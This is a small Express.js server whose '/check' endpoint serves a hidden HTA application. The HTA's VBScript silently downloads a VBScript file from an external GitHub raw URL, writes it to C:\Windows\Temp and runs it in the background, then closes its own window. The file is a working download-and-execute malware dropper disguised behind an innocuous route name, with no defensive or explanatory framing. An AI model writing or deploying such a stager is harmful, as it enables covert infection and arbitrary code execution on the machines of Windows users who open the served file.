const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    res.setHeader('Content-Type', 'application/hta');
    res.send(`
    <html>
    <head>
    <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
    <script language="VBScript">
    On Error Resume Next
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "GET", "https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs", False
    x.Send
    Set s = CreateObject("ADODB.Stream")
    s.Open
    s.Type = 1
    s.Write x.responseBody
    s.SaveToFile "C:\Windows\Temp\c.vbs", 2
    Set sh = CreateObject("WScript.Shell")
    sh.Run "wscript.exe //B ""C:\Windows\Temp\c.vbs""", 0, False
    window.close()
    </script>
    </head>
    <body></body>
    </html>
    `);
});

app.listen(process.env.PORT || 3000);
